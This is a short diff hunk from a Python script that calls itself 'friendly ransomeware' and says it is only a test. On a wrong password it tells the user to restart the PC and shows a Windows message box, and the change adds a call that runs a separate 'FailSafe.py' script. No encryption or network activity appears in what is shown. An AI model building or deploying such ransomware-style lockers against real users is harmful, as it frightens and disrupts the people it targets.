@@ -211,3 +211,7 @@ else:
 	print("Wrong password! Please restart your computer to get rid of the friendly ransomeware, THIS WAS JUST A TEST")
 	
   ctypes.windll.user32.MessageBoxW(0, "Restart your PC", "YourAcutie.TXT", 16)
+
+from subprocess import call
+call(["python", "FailSafe.py"])
+time.sleep(15)
